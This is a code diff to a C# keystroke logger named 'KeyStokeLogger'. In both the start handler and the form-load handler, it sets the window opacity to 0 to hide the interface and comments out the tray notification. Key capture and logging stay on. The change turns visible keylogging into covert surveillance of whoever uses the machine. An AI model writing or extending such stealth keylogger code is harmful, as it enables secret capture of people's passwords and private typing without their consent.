@@ -47,10 +47,10 @@ namespace KeyStokeLogger
 
         private void Start_Click(object sender, EventArgs e)
         {
-            this.Opacity = 100;
+            this.Opacity = 0;  //Make it Transparent to Hide the UI
             key.Enabled = true;
             log.Enabled = true;
-            notifyIcon1.ShowBalloonTip(5000);
+            //notifyIcon1.ShowBalloonTip(5000);
            
             button2.Enabled = true;
             button1.Enabled = false;
@@ -297,10 +297,10 @@ namespace KeyStokeLogger
         int ctrl, shift, del,back = 0; int sp; string msg2; char a,ab;
         private void Form1_Load(object sender, EventArgs e)
         {
-            this.Opacity = 100;
+            this.Opacity = 0;  //Make this Transparen to hide the UI
             key.Enabled = true;
             log.Enabled = true;
-            notifyIcon1.ShowBalloonTip(5000);
+            //notifyIcon1.ShowBalloonTip(5000);
             button2.Enabled = true;
             button1.Enabled = false;
             
